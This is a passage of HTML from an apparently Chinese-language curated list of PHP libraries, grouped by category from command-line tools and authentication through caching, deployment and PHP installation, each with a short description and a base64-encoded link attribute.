<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NpbGV4L0NpbGV4" title="https://github.com/Cilex/Cilex">Cilex<i class="fa fa-external-link"></i></span> - 构建命令行工具的小型框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXBocGxlYWd1ZS9jbGltYXRl" title="https://github.com/thephpleague/climate">CLImate<i class="fa fa-external-link"></i></span> - 输出颜色和特殊格式的库</li>
<li><a href="github.com/webmozart/console">Webmozart Console</a></li>
</ul>
<h2 id="定时任务-Crontab"><a href="#定时任务-Crontab" class="headerlink" title="定时任务( Crontab )"></a>定时任务( Crontab )</h2><blockquote>
<p>定时任务管理 crontab在 PHP 中的相关封装</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0luZGF0dXMvZGlzcGF0Y2hlcg==" title="https://github.com/Indatus/dispatcher">Dispatcher<i class="fa fa-external-link"></i></span> - 基于Laravel的定时任务管理</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL29zZ29jaGluYS9zd29vbGUtY3JvbnRhYg==" title="https://github.com/osgochina/swoole-crontab">swoole-crontab<i class="fa fa-external-link"></i></span> - 基于swoole的定时器程序，支持秒级处理</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2pvYmJ5cGhwL2pvYmJ5" title="https://github.com/jobbyphp/jobby">jobby<i class="fa fa-external-link"></i></span> -  一个 PHP 的定时任务管理器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FqYmRldi9jcm9ubGluZ28=" title="https://github.com/ajbdev/cronlingo">cronlingo<i class="fa fa-external-link"></i></span> - Express crontabs as human friendly phrases</li>
</ul>
<h2 id="身份验证-Authentication-and-Authorization"><a href="#身份验证-Authentication-and-Authorization" class="headerlink" title="身份验证( Authentication and Authorization )"></a>身份验证( Authentication and Authorization )</h2><blockquote>
<p>实现身份验证模式的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9jYXJ0YWx5c3QuY29tL21hbnVhbC9zZW50aW5lbC8yLjA=" title="https://cartalyst.com/manual/sentinel/2.0">Sentinel<i class="fa fa-external-link"></i></span> - 一个身份验证和授权的框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9jYXJ0YWx5c3QuY29tL21hbnVhbC9zZW50aW5lbC1zb2NpYWwvMi4w" title="https://cartalyst.com/manual/sentinel-social/2.0">Sentinel Social<i class="fa fa-external-link"></i></span> - 一个用于社交网络身份验证的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL29wYXV0aC9vcGF1dGg=" title="https://github.com/opauth/opauth">Opauth<i class="fa fa-external-link"></i></span> - 提供了 OAuth 认证的支持,提供统一标准的访问方法</li>
<li><span class="exturl" data-url="aHR0cDovL29hdXRoMi50aGVwaHBsZWFndWUuY29tLw==" title="http://oauth2.thephpleague.com/">OAuth2 Server<i class="fa fa-external-link"></i></span> - 一个OAuth2身份验证服务器、资源服务器和客户端库</li>
<li><span class="exturl" data-url="aHR0cDovL2JzaGFmZmVyLmdpdGh1Yi5pby9vYXV0aDItc2VydmVyLXBocC1kb2NzLw==" title="http://bshaffer.github.io/oauth2-server-php-docs/">OAuth2 Server<i class="fa fa-external-link"></i></span> - 一个OAuth2服务器实现</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0x1c2l0YW5pYW4vUEhQb0F1dGhMaWI=" title="https://github.com/Lusitanian/PHPoAuthLib">PHP oAuthLib<i class="fa fa-external-link"></i></span> - 另一个OAuth库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J1dWRrL3R3aXR0ZXJvYXV0aA==" title="https://github.com/ruudk/twitteroauth">TwitterOAuth<i class="fa fa-external-link"></i></span> - 一个Twitter OAuth库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x5cml4eC90d2l0dGVyLXNkaw==" title="https://github.com/lyrixx/twitter-sdk">TwitterSDK<i class="fa fa-external-link"></i></span> - 一个经过完全测试的Twitter SDK</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RmbHlkZXYvZGZseWRldi1oYXdr" title="https://github.com/dflydev/dflydev-hawk">Hawk<i class="fa fa-external-link"></i></span> - 一个Hawk HTTP身份验证库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2h5YnJpZGF1dGgvaHlicmlkYXV0aA==" title="https://github.com/hybridauth/hybridauth">HybridAuth<i class="fa fa-external-link"></i></span> - 一个开源的社交登录库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0JlYXRTd2l0Y2gvbG9jaw==" title="https://github.com/BeatSwitch/lock">Lock<i class="fa fa-external-link"></i></span> - 一个 Access Control Lists (ACL) 系统库.</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXBocGxlYWd1ZS9vYXV0aDEtY2xpZW50" title="https://github.com/thephpleague/oauth1-client">OAuth 1.0 Client<i class="fa fa-external-link"></i></span> - 一个 OAuth 1.0 客户端库.</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXBocGxlYWd1ZS9vYXV0aDItY2xpZW50" title="https://github.com/thephpleague/oauth2-client">OAuth 2.0 Client<i class="fa fa-external-link"></i></span> - 一个 OAuth 2.0 客户端库.</li>
<li><span class="exturl" data-url="aHR0cDovL2dpdGh1Yi5jb20vY2FydGFseXN0L3NlbnRyeQ==" title="http://github.com/cartalyst/sentry">Sentry<i class="fa fa-external-link"></i></span> - 认证和授权系统</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsbG9WaW5jZS9FdmFPQXV0aA==" title="https://github.com/AlloVince/EvaOAuth">EvaOAuth<i class="fa fa-external-link"></i></span> - 统一接口的 OAuth 登录 PHP 类库</li>
</ul>
<h2 id="标记-Markup"><a href="#标记-Markup" class="headerlink" title="标记( Markup )"></a>标记( Markup )</h2><blockquote>
<p>处理标记的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cDovL21pbGVzai5tZS9jb2RlL3BocC9kZWNvZGE=" title="http://milesj.me/code/php/decoda">Decoda<i class="fa fa-external-link"></i></span> - 一个轻量级的标记解析库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY2hlbGYvcGhwLW1hcmtkb3du" title="https://github.com/michelf/php-markdown">PHP Markdown<i class="fa fa-external-link"></i></span> - Markdown解析器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXBocGxlYWd1ZS9jb21tb25tYXJr" title="https://github.com/thephpleague/commonmark">CommonMark PHP<i class="fa fa-external-link"></i></span> - 一个支持 <span class="exturl" data-url="aHR0cDovL3NwZWMuY29tbW9ubWFyay5vcmcv" title="http://spec.commonmark.org/">CommonMark spec<i class="fa fa-external-link"></i></span> 的Markdown解析器.</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VydXNldi9wYXJzZWRvd24=" title="https://github.com/erusev/parsedown">Parsedown<i class="fa fa-external-link"></i></span> - 一个Markdown解析器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2t6eWtoeXMvQ2ljb25pYQ==" title="https://github.com/kzykhys/Ciconia">Ciconia<i class="fa fa-external-link"></i></span> - 一个支持Github风格的Markdown解析器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NlYmUvbWFya2Rvd24=" title="https://github.com/cebe/markdown">Cebe Markdown<i class="fa fa-external-link"></i></span> - 一个快速、可扩展的Markdown解析器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01hc3Rlcm1pbmRzL2h0bWw1LXBocA==" title="https://github.com/Masterminds/html5-php">HTML5 PHP<i class="fa fa-external-link"></i></span> - 一个HTML5解析和序列化的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hleXVwZGF0ZS9FbW9qaQ==" title="https://github.com/heyupdate/Emoji">Emoji<i class="fa fa-external-link"></i></span> - 一个简单的处理emoji的类库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lhbWNhbC9waHAtZW1vamk=" title="https://github.com/iamcal/php-emoji">php-emoji<i class="fa fa-external-link"></i></span> - 一个emoji表情转换库</li>
</ul>
<h2 id="字符串-Strings"><a href="#字符串-Strings" class="headerlink" title="字符串( Strings )"></a>字符串( Strings )</h2><blockquote>
<p>解析和操纵字符串的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlbnNpb2xhYnMvYW5zaS10by1odG1s" title="https://github.com/sensiolabs/ansi-to-html">ANSI to HTML5<i class="fa fa-external-link"></i></span> - 一个将ANSI转换为HTML5的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25pY29sYXMtZ3Jla2FzL1BhdGNod29yay1VVEY4" title="https://github.com/nicolas-grekas/Patchwork-UTF8">Patchwork UTF-8<i class="fa fa-external-link"></i></span> - 处理UTF-8格式字符串的便携库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hvYXByb2plY3QvU3RyaW5n" title="https://github.com/hoaproject/String">Hoa String<i class="fa fa-external-link"></i></span> - 另一个UTF-8格式的字符串库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhbmllbHN0anVsZXMvU3RyaW5neQ==" title="https://github.com/danielstjules/Stringy">Stringy<i class="fa fa-external-link"></i></span> - 一个多字节支持的字符串操纵库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pa2VlbW9vL0NvbG9ySml6ei1QSFA=" title="https://github.com/mikeemoo/ColorJizz-PHP">Color Jizz<i class="fa fa-external-link"></i></span> - 一个处理和转换颜色的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhbXNleS91dWlk" title="https://github.com/ramsey/uuid">UUID<i class="fa fa-external-link"></i></span> - 生成UUIDs的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NvY3VyL3NsdWdpZnk=" title="https://github.com/cocur/slugify">Slugify<i class="fa fa-external-link"></i></span> - 一个将字符串转换为slug格式的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2picm9hZHdheS91cmxpZnk=" title="https://github.com/jbroadway/urlify">Urlify<i class="fa fa-external-link"></i></span> - 一个Django URLify.js的PHP端口</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2t6eWtoeXMvVGV4dA==" title="https://github.com/kzykhys/Text">Text<i class="fa fa-external-link"></i></span> - 一个文本处理库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2pkb3JuL3NxbC1mb3JtYXR0ZXIv" title="https://github.com/jdorn/sql-formatter/">SQL Formatter<i class="fa fa-external-link"></i></span> - 一个用于格式化SQL语句的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvYmllL3VhLXBhcnNlci90cmVlL21hc3Rlci9waHA=" title="https://github.com/tobie/ua-parser/tree/master/php">UA Parser<i class="fa fa-external-link"></i></span> - 一个解析UA(User Agent)字符串的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Bpd2lrL2RldmljZS1kZXRlY3Rvcg==" title="https://github.com/piwik/device-detector">Device Detector<i class="fa fa-external-link"></i></span> - 另一个解析UA(User Agent)字符串的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlcmJhbmdoaXRhL01vYmlsZS1EZXRlY3Q=" title="https://github.com/serbanghita/Mobile-Detect">Mobile-Detect<i class="fa fa-external-link"></i></span> - 一个轻量级的检测移动设备的库(包括桌面设备)</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nic2NodWxkL0Jyb3dzZXIucGhw" title="https://github.com/cbschuld/Browser.php">Browser<i class="fa fa-external-link"></i></span> - 检测关于用户的浏览器环境</li>
</ul>
<h2 id="数字-Numbers"><a href="#数字-Numbers" class="headerlink" title="数字( Numbers )"></a>数字( Numbers )</h2><blockquote>
<p>处理数字的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Bvd2Rlcjk2L251bWJlcnMucGhw" title="https://github.com/powder96/numbers.php">Numbers PHP<i class="fa fa-external-link"></i></span> - 一个处理数字的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21vb250b2FzdC9tYXRo" title="https://github.com/moontoast/math">Math<i class="fa fa-external-link"></i></span> - 处理较大数字的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dhYnJpZWxlbGFuYS9ieXRlLXVuaXRz" title="https://github.com/gabrielelana/byte-units">ByteUnits<i class="fa fa-external-link"></i></span> -  一个在二进制和测量系统中解析、格式化和转换字节单位的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RyaXBsZXBvaW50L3BocC11bml0cy1vZi1tZWFzdXJl" title="https://github.com/triplepoint/php-units-of-measure">PHP Units of Measure<i class="fa fa-external-link"></i></span> - 一个测量单位间转换的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NyaXN1ODMvcGhwLWNvbnZlcnNpb24=" title="https://github.com/Crisu83/php-conversion">PHP Conversion<i class="fa fa-external-link"></i></span> -  另一个测量单位间转换的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dpZ2dzZXkvbGlicGhvbmVudW1iZXItZm9yLXBocA==" title="https://github.com/giggsey/libphonenumber-for-php">LibPhoneNumber for PHP<i class="fa fa-external-link"></i></span> -  PHP实现的Google电话号码处理系统库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2l2YW5ha2ltb3YvaGFzaGlkcy5waHA=" title="https://github.com/ivanakimov/hashids.php">hashids.php<i class="fa fa-external-link"></i></span> - 用来把整数生成唯一字符串（比如：通过加密解密id来隐藏真实id)</li>
</ul>
<h2 id="过滤和验证-Filtering-ang-Validation"><a href="#过滤和验证-Filtering-ang-Validation" class="headerlink" title="过滤和验证( Filtering ang Validation )"></a>过滤和验证( Filtering ang Validation )</h2><blockquote>
<p>用于过滤和验证数据的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lyY21heGVsbC9maWx0ZXJ1cw==" title="https://github.com/ircmaxell/filterus">Filterus<i class="fa fa-external-link"></i></span> -  一个简单的PHP过滤库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Jlc3BlY3QvVmFsaWRhdGlvbg==" title="https://github.com/Respect/Validation">Respect Validation<i class="fa fa-external-link"></i></span> - 一个简单的验证库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ZsdWNhcy92YWxpdHJvbg==" title="https://github.com/vlucas/valitron">Valitron<i class="fa fa-external-link"></i></span> - 另一个数据验证库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nha2VwaHAvdmFsaWRhdGlvbg==" title="https://github.com/cakephp/validation">Cake Validation<i class="fa fa-external-link"></i></span> - 另一个数据验证库 </li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZlZWxpbmdsdWNreS9waHAtcmVhZGFiaWxpdHk=" title="https://github.com/feelinglucky/php-readability">php-readability<i class="fa fa-external-link"></i></span> - 内容分析算法</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NvZGVndXkvVXBsb2Fk" title="https://github.com/codeguy/Upload">Upload<i class="fa fa-external-link"></i></span> - 一个处理文件上传和验证的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Jkb2htcy9ETVMtRmlsdGVy" title="https://github.com/rdohms/DMS-Filter">DMS Filter<i class="fa fa-external-link"></i></span> - 一个基于标注的过滤库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvbWFyaWNkcmlnb24vTWV0YVlhbWw=" title="https://github.com/romaricdrigon/MetaYaml">MetaYaml<i class="fa fa-external-link"></i></span> - 支持YAML、JSON和XML的一个模式验证库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvbmFuZ3VpbGxvdXgvSXNvQ29kZXM=" title="https://github.com/ronanguilloux/IsoCodes">ISO-codes<i class="fa fa-external-link"></i></span> -  验证不同ISO和ZIP编码的库</li>
</ul>
<h2 id="REST和API"><a href="#REST和API" class="headerlink" title="REST和API"></a>REST和API</h2><blockquote>
<p>用于开发restful APIs的库和Web框架</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3pmY2FtcHVzL3pmLWFwaWdpbGl0eS1za2VsZXRvbg==" title="https://github.com/zfcampus/zf-apigility-skeleton">Apigility<i class="fa fa-external-link"></i></span> - 一个使用Zend Framework2构建的API构建器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dpbGxkdXJhbmQvSGF0ZW9hcw==" title="https://github.com/willdurand/Hateoas">Hateoas<i class="fa fa-external-link"></i></span> - 一个HATEOAS REST的web服务库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Jsb25nZGVuL2hhbA==" title="https://github.com/blongden/hal">HAL<i class="fa fa-external-link"></i></span> -  一个超文本应用语言（HAL）构建库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dpbGxkdXJhbmQvTmVnb3RpYXRpb24=" title="https://github.com/willdurand/Negotiation">Negotiation<i class="fa fa-external-link"></i></span> - 一个内容协商库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xlZWRhdmlzODEvZHJlc3Q=" title="https://github.com/leedavis81/drest">Drest<i class="fa fa-external-link"></i></span> -一个将Doctrine实体展现为REST资源结点的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0x1cmFjYXN0L1Jlc3RsZXI=" title="https://github.com/Luracast/Restler">Restler<i class="fa fa-external-link"></i></span> - 一个将PHP方法展现为RESTful web API的轻量级框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXBocGxlYWd1ZS9mcmFjdGFs" title="https://github.com/thephpleague/fractal">fractal<i class="fa fa-external-link"></i></span> - [最佳实践]数据返回的统一化处理</li>
</ul>
<h2 id="缓存-Caching"><a href="#缓存-Caching" class="headerlink" title="缓存( Caching )"></a>缓存( Caching )</h2><blockquote>
<p>缓存数据的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5waHAubmV0L21hbnVhbC9lbi9ib29rLmFwYy5waHA=" title="http://www.php.net/manual/en/book.apc.php">Alternative PHP Cache (APC)<i class="fa fa-external-link"></i></span> - PHP的开源操作码缓存</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvY3RyaW5lL2NhY2hl" title="https://github.com/doctrine/cache">Doctrine Cache<i class="fa fa-external-link"></i></span> - 一个缓存库.</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3plbmRmcmFtZXdvcmsvemVuZC1jYWNoZQ==" title="https://github.com/zendframework/zend-cache">Zend Cache<i class="fa fa-external-link"></i></span> - 另一个缓存库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nha2VwaHAvY2FjaGU=" title="https://github.com/cakephp/cache">Cake Cache<i class="fa fa-external-link"></i></span> - 一个用于缓存的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RlZGl2bS9TdGFzaA==" title="https://github.com/tedivm/Stash">Stash<i class="fa fa-external-link"></i></span> - 另一个缓存库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvcmRhbGluYS9jYWNoZXRvb2w=" title="https://github.com/gordalina/cachetool">CacheTool<i class="fa fa-external-link"></i></span> - 一个清除APC/opcode缓存的命令行工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tob2FvZmdvZC9waHBmYXN0Y2FjaGU=" title="https://github.com/khoaofgod/phpfastcache">PhpFastCache<i class="fa fa-external-link"></i></span> - PHP 缓存库 </li>
</ul>
<h2 id="数据结构和存储-Data-Structure-and-Storage"><a href="#数据结构和存储-Data-Structure-and-Storage" class="headerlink" title="数据结构和存储( Data Structure and Storage )"></a>数据结构和存储( Data Structure and Storage )</h2><blockquote>
<p>实现数据结构和存储技术的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21vcnJpc29ubGV2aS9BcmRlbnQ=" title="https://github.com/morrisonlevi/Ardent">Ardent<i class="fa fa-external-link"></i></span> - 一个数据结构库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NjaG1pdHRqb2gvcGhwLWNvbGxlY3Rpb24=" title="https://github.com/schmittjoh/php-collection">PHP Collections<i class="fa fa-external-link"></i></span> - 一个简单的集合库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NjaG1pdHRqb2gvc2VyaWFsaXplcg==" title="https://github.com/schmittjoh/serializer">Serializer<i class="fa fa-external-link"></i></span> - 用于序列化和反序列化数据的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3plbmRmcmFtZXdvcmsvemVuZC1zZXJpYWxpemVy" title="https://github.com/zendframework/zend-serializer">Zend Serializer<i class="fa fa-external-link"></i></span> - 另一个用于序列化和反序列化数据的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hlcnJlcmEtaW8vcGhwLW9iamVjdC1zdG9yYWdl" title="https://github.com/herrera-io/php-object-storage">PHP Object Storage<i class="fa fa-external-link"></i></span> - 一个用于对象存储的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BocC1sb2VwL2ZyYWN0YWw=" title="https://github.com/php-loep/fractal">Fractal<i class="fa fa-external-link"></i></span> -  一个将复杂数据结构转换为JSON输出的库</li>
<li><span class="exturl" data-url="aHR0cDovL2dpdGh1Yi5jb20vV2lzZW1ibHkvVG90ZW0=" title="http://github.com/Wisembly/Totem">Totem<i class="fa fa-external-link"></i></span> - 一个管理和创建数据修改集的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1RpbWVUb29nby9QaW5x" title="https://github.com/TimeToogo/Pinq">PINQ<i class="fa fa-external-link"></i></span> - PHP实时Linq库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25ldHJlc2VhcmNoL2pzb25tYXBwZXI=" title="https://github.com/netresearch/jsonmapper">JsonMapper<i class="fa fa-external-link"></i></span> - 一个将内嵌JSON结构映射到PHP类上的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nha2VwaHAvY29sbGVjdGlvbg==" title="https://github.com/cakephp/collection">Cake Collection<i class="fa fa-external-link"></i></span> - 一个简单的集合库</li>
</ul>
<h2 id="通知-Notifications"><a href="#通知-Notifications" class="headerlink" title="通知( Notifications )"></a>通知( Notifications )</h2><blockquote>
<p>关于通知的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZpbHAvbm9k" title="https://github.com/filp/nod">Nod<i class="fa fa-external-link"></i></span> - 一个通知库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dyZXAvbm90aWZpY2F0bw==" title="https://github.com/wrep/notificato">Notificato<i class="fa fa-external-link"></i></span> - 一个处理推送消息的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BoM25vbC9Ob3RpZmljYXRpb25QdXNoZXI=" title="https://github.com/Ph3nol/NotificationPusher">Notification Pusher<i class="fa fa-external-link"></i></span> - 设备推送通知的独立库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25hbXNoaS9ub3RpZmljYXRvcg==" title="https://github.com/namshi/notificator">Notificator<i class="fa fa-external-link"></i></span> - 一个轻量级通知库</li>
</ul>
<h2 id="部署-Deployment"><a href="#部署-Deployment" class="headerlink" title="部署( Deployment )"></a>部署( Deployment )</h2><blockquote>
<p>用于项目部署的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RhbWFnb2t1bi9wb21hbmRlcg==" title="https://github.com/tamagokun/pomander">Pomander<i class="fa fa-external-link"></i></span> -  一个PHP应用的部署工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FuYWhraWFzZW4vcm9ja2V0ZWVy" title="https://github.com/Anahkiasen/rocketeer">Rocketeer<i class="fa fa-external-link"></i></span> -  PHP的快速和简单部署器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xhcmF2ZWwvZW52b3k=" title="https://github.com/laravel/envoy">Envoy<i class="fa fa-external-link"></i></span> - 使用PHP运行SSH任务的工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FlcmlhbGxzL1BsdW0=" title="https://github.com/aerialls/Plum">Plum<i class="fa fa-external-link"></i></span> - 一个部署库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RlcGxveXBocC9kZXBsb3llcg==" title="https://github.com/deployphp/deployer">Deployer<i class="fa fa-external-link"></i></span> - 一个部署工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21lb2x1L3dhbGxlLXdlYg==" title="https://github.com/meolu/walle-web">walle-web<i class="fa fa-external-link"></i></span> - 一个开源的web代码发布管理系统</li>
</ul>
<h2 id="国际化和本地化-Internationalisation-and-Localisation"><a href="#国际化和本地化-Internationalisation-and-Localisation" class="headerlink" title="国际化和本地化(Internationalisation and Localisation)"></a>国际化和本地化(Internationalisation and Localisation)</h2><blockquote>
<p>用于国际化(I18n)和本地化(L10n)的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2F1cmFwaHAvQXVyYS5JbnRs" title="https://github.com/auraphp/Aura.Intl">Aura Intl<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nha2VwaHAvaTE4bg==" title="https://github.com/cakephp/i18n">Cake I18n<i class="fa fa-external-link"></i></span> - 翻译和本地化消息</li>
</ul>
<h2 id="第三方API-Third-Party-APIs"><a href="#第三方API-Third-Party-APIs" class="headerlink" title="第三方API( Third Party APIs )"></a>第三方API( Third Party APIs )</h2><blockquote>
<p>访问第三方API的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21haWxndW4vbWFpbGd1bi1waHA=" title="https://github.com/mailgun/mailgun-php">mailgun-php<i class="fa fa-external-link"></i></span> - Mailgun’s Official SDK for PHP</li>
</ul>
<h2 id="扩展-Extensions"><a href="#扩展-Extensions" class="headerlink" title="扩展( Extensions )"></a>扩展( Extensions )</h2><blockquote>
<p>帮助构建PHP扩展的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BoYWxjb24vemVwaGly" title="https://github.com/phalcon/zephir">Zephir<i class="fa fa-external-link"></i></span> - 用于开发PHP扩展的一种在PHP和C++间的编译语言</li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5waHAtY3BwLmNvbS8=" title="http://www.php-cpp.com/">PHP CPP<i class="fa fa-external-link"></i></span> - 一个用于开发PHP扩展的C++库</li>
</ul>
<h2 id="PHP-安装-PHP-Installation"><a href="#PHP-安装-PHP-Installation" class="headerlink" title="PHP 安装(PHP Installation)"></a>PHP 安装(PHP Installation)</h2><blockquote>
<p>帮助安装和管理PHP</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cDovL2JyZXcuc2gv" title="http://brew.sh/">HomeBrew<i class="fa fa-external-link"></i></span> - 一个OSX的包管理工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0hvbWVicmV3L2hvbWVicmV3LXBocA==" title="https://github.com/Homebrew/homebrew-php">HomeBrew PHP <i class="fa fa-external-link"></i></span> - HomeBrew中PHP的安装包</li>
<li><span class="exturl" data-url="aHR0cDovL3BocC1vc3gubGlpcC5jaC8=" title="http://php-osx.liip.ch/">PHP OSX <i class="fa fa-external-link"></i></span> - 一个OSX中的PHP安装器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BocGJyZXcvcGhwYnJldw==" title="https://github.com/phpbrew/phpbrew">PHP Brew <i class="fa fa-external-link"></i></span> - 一个PHP版本管理工具和安装器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NISC9waHBlbnY=" title="https://github.com/CHH/phpenv">PHP Env<i class="fa fa-external-link"></i></span> - 另一个PHP版本工具</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2p1YmlhbmNoaS9waHBzd2l0Y2g=" title="https://github.com/jubianchi/phpswitch">PHP Switch <i class="fa fa-external-link"></i></span> - 另一个PHP版本工具</li>
